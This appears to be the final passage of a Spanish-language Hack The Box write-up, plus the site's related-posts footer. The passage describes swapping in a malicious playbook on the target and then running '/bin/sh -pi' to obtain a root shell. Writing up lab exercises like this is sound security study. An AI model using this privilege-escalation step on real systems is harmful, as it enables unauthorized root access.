<p>Ejecutar el ejecutable compilado en el objetivo debería reemplazar el archivo con nuestro playbook malicioso después de un par de minutos. A continuación, esperamos otro par de minutos y ejecutamos /bin/sh -pi para generar un intérprete de comandos raíz.</p> </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.QlzOxquK_12zkJG.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Broker - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/broker/"> Broker - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.R-ZwdRw5_Z1hxbOg.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Crafty - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/crafty/"> Crafty - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.262ecYt-_1fWT2n.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Devvortex - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/devvortex/"> Devvortex - HTB Writeup </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Fullaw4ke. All rights reserved.
</footer> </main>    </body> </html> 